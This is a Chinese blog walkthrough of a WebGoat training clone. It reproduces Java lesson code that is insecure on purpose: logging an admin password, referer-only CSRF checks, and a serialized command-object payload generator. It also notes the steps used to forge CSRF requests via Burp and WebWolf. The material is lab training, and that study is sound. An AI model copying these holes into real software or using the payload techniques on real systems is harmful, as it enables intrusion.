<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.dummy.insecure.framework;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unserlize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">VulnerableTaskHolder</span> <span class="variable">vulnerableTaskHolder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;ping&quot;</span>,<span class="string">&quot;ping -n 4 127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(vulnerableTaskHolder);</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914205500174.png" alt="image-20220914205500174"></p>
<p>填进去就过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914205629800.png" alt="image-20220914205629800"></p>
<h2 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h2><h3 id="LogSpoofing"><a href="#LogSpoofing" class="headerlink" title="LogSpoofing"></a>LogSpoofing</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.logging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogSpoofing</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;logging.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LogSpoofingTask"><a href="#LogSpoofingTask" class="headerlink" title="LogSpoofingTask"></a>LogSpoofingTask</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.logging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.util.Strings;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogSpoofingTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/LogSpoofing/log-spoofing&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String username,<span class="meta">@RequestParam</span> String password)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Strings.isEmpty(username))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(username).build();</span><br><span class="line">        &#125;</span><br><span class="line">        username = username.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (username.contains(<span class="string">&quot;&lt;p&gt;&quot;</span>) || username.contains(<span class="string">&quot;&lt;div&gt;&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;Try to think of something simple &quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (username.indexOf(<span class="string">&quot;&lt;br/&gt;&quot;</span>) &lt; username.indexOf(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).output(username).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(username).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没看懂这关要干嘛  输admin 就过</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211141231.png" alt="image-20220914211141231"></p>
<h3 id="LogBleedingTask"><a href="#LogBleedingTask" class="headerlink" title="LogBleedingTask"></a>LogBleedingTask</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.logging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.util.Strings;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogBleedingTask</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(<span class="built_in">this</span>.getClass().getName());</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">generatePassword</span><span class="params">()</span>&#123;</span><br><span class="line">        password = UUID.randomUUID().toString();</span><br><span class="line">        log.info(<span class="string">&quot;Password for admin: &#123;&#125;&quot;</span>, Base64.getEncoder().encodeToString(password.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/LogSpoofing/log-bleeding&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String username,<span class="meta">@RequestParam</span> String password)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (Strings.isEmpty(username) || Strings.isEmpty(password))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;Please provide username (Admin) and password&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (username.equals(<span class="string">&quot;Admin&quot;</span>) &amp;&amp; password.equals(<span class="built_in">this</span>.password))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里让我们查日志 其实应该器linux机器上面查的 这里就先不搞了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211821022.png" alt="image-20220914211821022"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211829938.png" alt="image-20220914211829938"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211841561.png" alt="image-20220914211841561"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914211908537.png" alt="image-20220914211908537"></p>
<h2 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h2><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.csrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CSRF</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;csrf.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CSRFConfirmFlag1"><a href="#CSRFConfirmFlag1" class="headerlink" title="CSRFConfirmFlag1"></a>CSRFConfirmFlag1</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.csrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;csrf-get.hint1&quot;, &quot;csrf-get.hint2&quot;, &quot;csrf-get.hint3&quot;, &quot;csrf-get.hint4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CSRFConfirmFlag1</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/csrf/confirm-flag-1&quot;,produces = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(String confirmFlagVal)</span>&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">userSessionDataStr</span> <span class="operator">=</span> userSessionData.getValue(<span class="string">&quot;csrf-get-success&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (userSessionDataStr != <span class="literal">null</span> &amp;&amp; confirmFlagVal.equals(userSessionDataStr.toString()))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;csrf-get-null-referer.success&quot;</span>)</span><br><span class="line">                    .output(<span class="string">&quot;Correct, the flag was &quot;</span> + userSessionData.getValue(<span class="string">&quot;csrf-get-success&quot;</span>))</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CSRFGetFlag"><a href="#CSRFGetFlag" class="headerlink" title="CSRFGetFlag"></a>CSRFGetFlag</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.csrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.PluginMessages;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CSRFGetFlag</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserSessionData userSessionData;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> PluginMessages pluginMessages;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/csrf/basic-get-flag&quot;,produces = &#123;&quot;application/json&quot;&#125;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title function_">invoke</span><span class="params">(HttpServletRequest req)</span>&#123;</span><br><span class="line">        Map&lt;String,Object&gt; response = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> (req.getHeader(<span class="string">&quot;host&quot;</span>) == <span class="literal">null</span>) ? <span class="string">&quot;NULL&quot;</span>: req.getHeader(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">referer</span> <span class="operator">=</span> (req.getHeader(<span class="string">&quot;referer&quot;</span>) == <span class="literal">null</span>) ? <span class="string">&quot;NULL&quot;</span> : req.getHeader(<span class="string">&quot;referer&quot;</span>);</span><br><span class="line">        String[] refererArr = referer.split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (referer.equals(<span class="string">&quot;NULL&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equals(req.getParameter(<span class="string">&quot;csrf&quot;</span>)))&#123;</span><br><span class="line">                <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">                userSessionData.setValue(<span class="string">&quot;csrf-get-success&quot;</span>,random.nextInt(<span class="number">65536</span>));</span><br><span class="line">                response.put(<span class="string">&quot;success&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">                response.put(<span class="string">&quot;message&quot;</span>,pluginMessages.getMessage(<span class="string">&quot;csrf-get-null-referer.success&quot;</span>));</span><br><span class="line">                response.put(<span class="string">&quot;flag&quot;</span>,userSessionData.getValue(<span class="string">&quot;csrf-get-success&quot;</span>));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (refererArr[<span class="number">2</span>].equals(host))&#123;</span><br><span class="line">            response.put(<span class="string">&quot;success&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">            response.put(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;Appears the request came from the original host&quot;</span>);</span><br><span class="line">            response.put(<span class="string">&quot;flag&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">            userSessionData.setValue(<span class="string">&quot;csrf-get-success&quot;</span>,random.nextInt(<span class="number">65536</span>));</span><br><span class="line">            response.put(<span class="string">&quot;success&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            response.put(<span class="string">&quot;message&quot;</span>,pluginMessages.getMessage(<span class="string">&quot;csrf-get-other-referer.success&quot;</span>));</span><br><span class="line">            response.put(<span class="string">&quot;flag&quot;</span>,userSessionData.getValue(<span class="string">&quot;csrf-get-success&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里如果直接访问的话就会导致同一个host 这里我们需要做的是将我们写的恶意的链接发送给受害者,而不是让受害者在原先正常的链接上去请求</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220420551.png" alt="image-20220914220420551"></p>
<p>这里直接截取一个数据包 然后使用burp生成一个csrf表单</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220557068.png" alt="image-20220914220557068"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220621795.png" alt="image-20220914220621795"></p>
<p>我们在本地生成一个csrf.html文件并将内容填入进去</p>
<p>来到webwolf上传文件并获取一个url</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220901885.png" alt="image-20220914220901885"></p>
<p>然后就是我们需要将这个url发送给受害者去点击 当然这里可以做成自动的点击操作</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914220941291.png" alt="image-20220914220941291"></p>
<p>填入获取到的flag即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914221015044.png" alt="image-20220914221015044"></p>
<h3 id="ForgedReviews"><a href="#ForgedReviews" class="headerlink" title="ForgedReviews"></a>ForgedReviews</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.csrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Lists;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.joda.time.DateTime;</span><br><span class="line"><span class="keyword">import</span> org.joda.time.format.DateTimeFormat;</span><br><span class="line"><span class="keyword">import</span> org.joda.time.format.DateTimeFormatter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;csrf-review-hint1&quot;, &quot;csrf-review-hint2&quot;, &quot;csrf-review-hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForgedReviews</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">DateTimeFormatter</span> <span class="variable">fmt</span> <span class="operator">=</span> DateTimeFormat.forPattern(<span class="string">&quot;yyyy-MM-dd, HH:mm:ss&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, List&lt;Review&gt;&gt; userReviews = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;Review&gt; REVIEWS = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">weakAntiCSRF</span> <span class="operator">=</span> <span class="string">&quot;2aa14227b9a13d0bede0388a7fba9aa9&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        REVIEWS.add(<span class="keyword">new</span> <span class="title class_">Review</span>(<span class="string">&quot;secUriTy&quot;</span>, DateTime.now().toString(fmt), <span class="string">&quot;This is like swiss cheese&quot;</span>, <span class="number">0</span>));</span><br><span class="line">        REVIEWS.add(<span class="keyword">new</span> <span class="title class_">Review</span>(<span class="string">&quot;webgoat&quot;</span>, DateTime.now().toString(fmt), <span class="string">&quot;It works, sorta&quot;</span>, <span class="number">2</span>));</span><br><span class="line">        REVIEWS.add(<span class="keyword">new</span> <span class="title class_">Review</span>(<span class="string">&quot;guest&quot;</span>, DateTime.now().toString(fmt), <span class="string">&quot;Best, App, Ever&quot;</span>, <span class="number">5</span>));</span><br><span class="line">        REVIEWS.add(<span class="keyword">new</span> <span class="title class_">Review</span>(<span class="string">&quot;guest&quot;</span>, DateTime.now().toString(fmt), <span class="string">&quot;This app is so insecure, I didn&#x27;t even post this review, can you pull that off too?&quot;</span>, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(path = &quot;/csrf/review&quot;,produces = MediaType.APPLICATION_JSON_VALUE,consumes = ALL_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;Review&gt; <span class="title function_">retrieveReviews</span><span class="params">()</span>&#123;</span><br><span class="line">        Collection&lt;Review&gt; allReviews = Lists.newArrayList();</span><br><span class="line">        Collection&lt;Review&gt; newReviews = userReviews.get(webSession.getUserName());</span><br><span class="line">        <span class="keyword">if</span> (newReviews != <span class="literal">null</span>)&#123;</span><br><span class="line">            allReviews.addAll(newReviews);</span><br><span class="line">        &#125;</span><br><span class="line">        allReviews.addAll(REVIEWS);</span><br><span class="line">        <span class="keyword">return</span> allReviews;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/csrf/review&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">createNewReview</span><span class="params">(String reviewText, Integer starts , String validateReq, HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> (request.getHeader(<span class="string">&quot;host&quot;</span>) ==<span class="literal">null</span>) ?<span class="string">&quot;NULL&quot;</span>:request.getHeader(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">referer</span> <span class="operator">=</span> (request.getHeader(<span class="string">&quot;referer&quot;</span>) ==<span class="literal">null</span>)?<span class="string">&quot;NULL&quot;</span> :request.getHeader(<span class="string">&quot;referer&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> String[] refererArr =referer.split(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="type">Review</span> <span class="variable">review</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Review</span>();</span><br><span class="line">        review.setText(reviewText);</span><br><span class="line">        review.setDateTime(DateTime.now().toString(fmt));</span><br><span class="line">        review.setUser(webSession.getUserName());</span><br><span class="line">        review.setStars(starts);</span><br><span class="line">        <span class="type">var</span> <span class="variable">reviews</span> <span class="operator">=</span> userReviews.getOrDefault(webSession.getUserName(),<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        reviews.add(review);</span><br><span class="line">        userReviews.put(webSession.getUserName(),reviews);</span><br><span class="line">        <span class="keyword">if</span> (validateReq != <span class="string">&quot;NULL&quot;</span> &amp;&amp; refererArr[<span class="number">2</span>].equals(host))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;csrf-same-host&quot;</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;csrf-review.success&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.csrf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.annotation.XmlRootElement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@XmlRootElement</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Review</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="keyword">private</span> String dateTime;</span><br><span class="line">    <span class="keyword">private</span> String  text;</span><br><span class="line">    <span class="keyword">private</span> Integer stars;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914224458214.png" alt="image-20220914224458214"></p>
<p>还是类似的操作</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220914224523769.png" alt="image-20220914224523769"></p>
